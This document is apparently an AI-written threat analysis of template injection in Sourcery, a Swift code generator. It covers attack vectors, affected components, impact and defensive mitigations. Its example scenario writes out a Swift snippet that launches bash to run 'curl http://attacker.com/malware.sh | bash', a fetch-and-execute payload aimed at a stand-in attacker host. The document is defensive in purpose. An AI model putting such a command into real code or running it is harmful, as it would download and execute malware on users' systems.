Okay, here's a deep analysis of the "Template Injection" attack surface for applications using Sourcery, formatted as Markdown:

# Deep Analysis: Sourcery Template Injection Attack Surface

## 1. Objective, Scope, and Methodology

### 1.1. Objective

The objective of this deep analysis is to thoroughly examine the "Template Injection" attack surface in applications utilizing Sourcery.  We aim to:

*   Understand the specific mechanisms by which template injection can occur.
*   Identify the precise components of Sourcery and the development workflow that are vulnerable.
*   Evaluate the potential impact of successful attacks in greater detail.
*   Propose concrete, actionable mitigation strategies beyond the initial high-level overview.
*   Determine how to integrate security checks into the development and deployment pipeline.

### 1.2. Scope

This analysis focuses exclusively on the template injection vulnerability related to Sourcery.  It encompasses:

*   **Sourcery's Template Processing:**  The core functionality of parsing and processing templates.
*   **Template Storage and Access:**  How templates are stored, accessed, and managed.
*   **Build and Deployment Pipeline:**  The process of generating code and deploying the application, including where Sourcery is invoked.
*   **Generated Code:** The output of Sourcery, which is the ultimate target of the injected code.
*   **Development Environment:** The security of the systems used by developers working with Sourcery and templates.

This analysis *does not* cover:

*   Other, unrelated attack vectors against the application.
*   Vulnerabilities in the Swift language itself (beyond those exploited through template injection).
*   General security best practices unrelated to Sourcery.

### 1.3. Methodology

This analysis will employ the following methodology:

1.  **Code Review (Hypothetical):**  While we don't have direct access to Sourcery's internal codebase, we will analyze its public documentation and known behavior to *hypothetically* review its template parsing and processing logic for potential vulnerabilities.
2.  **Threat Modeling:**  We will construct threat models to identify potential attackers, attack vectors, and the impact of successful attacks.
3.  **Best Practice Analysis:**  We will compare Sourcery's design and recommended usage against established security best practices for template engines and code generation tools.
4.  **Mitigation Strategy Development:**  We will develop specific, actionable mitigation strategies, prioritizing those that are most effective and feasible to implement.
5.  **Integration Recommendations:**  We will provide recommendations for integrating security checks into the development and deployment pipeline.

## 2. Deep Analysis of the Attack Surface

### 2.1. Attack Vectors and Scenarios

Several attack vectors can lead to template injection:

*   **Compromised Template Repository:**  An attacker gains unauthorized write access to the Git repository (or other storage) where Sourcery templates are stored. This is the most direct and likely attack vector.  This could occur through:
    *   **Stolen Credentials:**  An attacker obtains the credentials of a developer or build system with write access to the repository.
    *   **Repository Misconfiguration:**  The repository is accidentally made publicly writable or has overly permissive access controls.
    *   **Insider Threat:**  A malicious or disgruntled developer intentionally modifies a template.
    *   **Supply Chain Attack:**  A compromised dependency or third-party tool used in the build process modifies the templates.

*   **Compromised Build Server:**  An attacker gains control of the server where Sourcery is executed. This allows them to modify templates before they are processed, even if the repository itself is secure.  This could occur through:
    *   **Vulnerable Build Server Software:**  Exploitation of vulnerabilities in the operating system, build tools (e.g., Jenkins, GitLab CI), or other software running on the build server.
    *   **Weak Authentication:**  Weak or default passwords on the build server.

*   **Man-in-the-Middle (MitM) Attack (Less Likely):**  If templates are fetched over an insecure connection (e.g., HTTP instead of HTTPS), an attacker could intercept and modify the templates in transit. This is less likely if the repository is accessed via SSH or HTTPS.

*   **Dynamic Template Loading (Highly Discouraged):** If, against best practices, the application loads templates from external sources (e.g., a database, user input, a remote URL), an attacker could inject malicious code by controlling that external source.  This is a *very high-risk* scenario.

**Example Scenario (Compromised Repository):**

1.  **Attacker Gains Access:** An attacker phishes a developer and obtains their Git credentials.
2.  **Template Modification:** The attacker modifies a template file (e.g., `MyTemplate.stencil`) to include the following Swift code within a code generation block:
    ```swift
    // ... existing template content ...
    %{
        import Foundation
        let task = Process()
        task.launchPath = "/bin/bash"
        task.arguments = ["-c", "curl http://attacker.com/malware.sh | bash"]
        task.launch()
    }%
    // ... existing template content ...
    ```
3.  **Code Generation:**  The next time Sourcery runs (e.g., during a build), it processes the modified template.
4.  **Malicious Code Execution:** The generated Swift code now includes the attacker's code, which downloads and executes a shell script from the attacker's server. This script could install malware, open a reverse shell, or perform other malicious actions.
5.  **Deployment:** The application, now containing the malicious code, is deployed.
6.  **Exploitation:** When the relevant part of the application is executed, the injected code runs, compromising the system.

### 2.2. Sourcery Components Involved

*   **Template Parsing Engine:**  Sourcery's core component responsible for reading, parsing, and interpreting the template files (usually `.stencil` files).  This is the primary attack surface.  We need to assume this component *could* have subtle vulnerabilities that allow for code injection, even if the template syntax appears to be correctly handled.
*   **Template Loading Mechanism:**  The code within Sourcery that loads templates from the file system or other sources.  If this mechanism is not secure, it could be exploited to load malicious templates.
*   **Code Generation Engine:**  The component that takes the parsed template and generates the Swift code.  While not directly vulnerable to injection, it is the conduit through which the injected code is delivered.
*   **Command-Line Interface (CLI):**  The way developers interact with Sourcery.  Misuse of CLI options (e.g., specifying an untrusted template path) could potentially lead to vulnerabilities.
*   **Configuration Files:**  Sourcery's configuration files (e.g., `.sourcery.yml`) might specify template locations or other settings.  If these files are compromised, they could be used to point Sourcery to malicious templates.

### 2.3. Impact Analysis (Expanded)

The impact of a successful template injection attack is severe and can include:

*   **Complete System Compromise:**  The attacker can gain full control of the system running the generated code. This could be a developer's machine, a build server, or a production server.
*   **Data Exfiltration:**  The attacker can steal sensitive data, including source code, API keys, database credentials, and customer data.
*   **Data Modification:**  The attacker can modify data stored by the application, potentially leading to data corruption or integrity violations.
*   **Denial of Service (DoS):**  The attacker can inject code that crashes the application or consumes excessive resources, making it unavailable to legitimate users.
*   **Lateral Movement:**  The attacker can use the compromised system as a foothold to attack other systems on the network.
*   **Reputational Damage:**  A successful attack can severely damage the reputation of the organization responsible for the application.
*   **Legal and Financial Consequences:**  Data breaches can lead to lawsuits, fines, and other legal and financial penalties.

### 2.4. Mitigation Strategies (Detailed)

The initial mitigation strategies are a good starting point, but we need to elaborate on them and add more specific recommendations:

1.  **Strict Access Control (Reinforced):**
    *   **Principle of Least Privilege:**  Grant only the *minimum* necessary permissions to developers and build systems.  Developers should not have write access to the template repository in production environments.
    *   **Multi-Factor Authentication (MFA):**  Enforce MFA for all access to the template repository and build server.
    *   **Role-Based Access Control (RBAC):**  Implement RBAC to define specific roles (e.g., "Template Editor," "Build Administrator") with granular permissions.
    *   **Regular Access Reviews:**  Periodically review access permissions to ensure they are still appropriate.

2.  **Mandatory Code Reviews (Enhanced):**
    *   **Two-Person Rule:**  Require at least *two* independent reviewers for *every* template change.
    *   **Checklists:**  Develop specific checklists for template reviews, focusing on security considerations (e.g., "Does this template contain any potentially dangerous code?").
    *   **Automated Checks:**  Use tools to automatically flag potentially dangerous constructs in templates (e.g., `Process.launch`, network access).  This can be integrated into the code review process.
    *   **Training:**  Provide training to developers on secure template development practices.

3.  **Version Control and Audit Trails (Detailed):**
    *   **Git Hooks:**  Use Git hooks (e.g., pre-commit, pre-push) to enforce security checks before template changes are committed or pushed to the repository.  These hooks could, for example, run static analysis tools.
    *   **Detailed Commit Messages:**  Require developers to write clear and detailed commit messages explaining the purpose of each template change.
    *   **Immutable History:**  Configure the repository to prevent rewriting of history (e.g., force-pushing).

4.  **Digital Signatures (Implementation Details):**
    *   **Custom Scripting:**  Since Sourcery doesn't natively support digital signatures, you'll need to implement a custom solution. This could involve:
        *   A script that runs before Sourcery, verifying the signature of each template against a trusted public key.
        *   A script that runs after template changes, signing the modified templates with a private key.
        *   Integration with a key management system (KMS) to securely store and manage the private key.
    *   **Signature Format:**  Choose a standard signature format (e.g., PGP, GPG).
    *   **Key Rotation:**  Implement a key rotation policy to regularly update the signing keys.

5.  **Regular Security Audits (Expanded):**
    *   **Penetration Testing:**  Conduct regular penetration testing of the build environment and the application, specifically targeting the template injection vulnerability.
    *   **Vulnerability Scanning:**  Use vulnerability scanners to identify and remediate vulnerabilities in the build server and its dependencies.
    *   **Code Audits:**  Perform regular security code audits of the application and the Sourcery configuration.

6.  **Input Validation (Clarification):**
    *   **Avoid External Templates:**  The best approach is to *completely avoid* loading templates from external sources.  If absolutely necessary, treat this as an extremely high-risk scenario.
    *   **Strict Whitelisting:**  If external templates *must* be used, implement strict whitelisting of allowed template locations and filenames.  Do *not* rely on blacklisting.
    *   **Path Traversal Prevention:**  Ensure that any input used to specify the template location is rigorously validated to prevent path traversal attacks.

7.  **Static Analysis of Generated Code (Tools):**
    *   **SwiftLint:**  Use SwiftLint with custom rules to detect potentially dangerous code patterns in the generated Swift code.
    *   **Semgrep:**  Semgrep is a powerful static analysis tool that can be used to find security vulnerabilities in Swift code, including those introduced by template injection.
    *   **Commercial Static Analysis Tools:**  Consider using commercial static analysis tools for more comprehensive analysis.

8.  **Runtime Protection (Ideal, but Difficult):**
    *   **Code Integrity Checks:**  Ideally, the runtime environment would have mechanisms to verify the integrity of the generated code before execution.  This is difficult to achieve in Swift without significant modifications to the runtime.
    *   **Sandboxing:**  If possible, run the generated code in a sandboxed environment to limit its access to system resources.

9. **Secure Development Environment:**
    * **Developer Machine Security:** Ensure developers' machines are secure, with up-to-date operating systems, antivirus software, and strong passwords.
    * **Secure Network Connections:** Use secure network connections (e.g., VPN) when accessing the template repository or build server.

### 2.5. Integration into Development and Deployment Pipeline

Security checks should be integrated into every stage of the development and deployment pipeline:

*   **Development:**
    *   **IDE Integration:**  Integrate static analysis tools (e.g., SwiftLint, Semgrep) into the developer's IDE to provide real-time feedback on potential vulnerabilities.
    *   **Pre-Commit Hooks:**  Use Git pre-commit hooks to run automated checks before template changes are committed.

*   **Build:**
    *   **CI/CD Pipeline:**  Integrate security checks into the CI/CD pipeline (e.g., Jenkins, GitLab CI).  These checks should include:
        *   Template signature verification (if implemented).
        *   Static analysis of the generated code.
        *   Vulnerability scanning of the build environment.
    *   **Build Failure:**  Configure the build to fail if any security checks fail.

*   **Deployment:**
    *   **Automated Deployment:**  Use automated deployment tools to ensure that only code that has passed all security checks is deployed.
    *   **Rollback Mechanisms:**  Implement rollback mechanisms to quickly revert to a previous, known-good version of the application in case of a security incident.
